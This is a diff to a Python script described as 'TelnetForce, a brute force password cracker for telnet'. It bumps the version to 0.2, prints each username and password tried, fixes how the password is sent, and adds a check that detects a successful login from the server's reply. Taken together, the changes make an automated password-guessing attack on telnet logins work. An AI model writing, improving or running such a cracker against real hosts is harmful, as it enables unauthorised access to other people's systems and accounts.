@@ -5,6 +5,8 @@ TelnetForce, a brute force password cracker for telnet.
 
 """
 
+__version__="0.2"
+
 import telnetlib
 import threading
 from generator import StringGen
@@ -48,6 +50,7 @@ class TelnetForce(threading.Thread):
         host -- the name of the machine we are connecting to.
 
         """
+        print('trying: %s | %s' %(_uname, _pword))
         tn = telnetlib.Telnet(self.host)
         try:
             tn.read_until(b"login: ")
@@ -58,19 +61,28 @@ class TelnetForce(threading.Thread):
         try:
             tn.write(_uname)
         except socket.error:
+            print('error: write(uname) failed')
             return 0
         try:
             tn.read_until(b"Password: ")
         except EOFError:
+            print('error: read("password") failed')
             return 0
         # try a password
         try:
-            tn.write(_pword)
+            tn.write(_pword+'\r\n')
         except socket.error:
+            print('error: write(pword) failed')
             return 0
         # check for success
+        try:
+            (i,obj,byt) = tn.expect([b'incorrect', b'@'], 2)
+        except EOFError:
+            return 0
+        if i == 1:
+            return 1
         tn.close()
-        return 1
+        return 0
 
     def start_trying(self):
         """ Start trying user/password combinations.  It will try to guess
@@ -91,6 +103,8 @@ class TelnetForce(threading.Thread):
             if self.tries == 0:
                 _uname = nfp.readline(15)
                 if not _uname:
+                    nfp.close()
+                    print("Password not found.")
                     return 0
                 self.tries = 15
             self.tries = self.tries - 1            
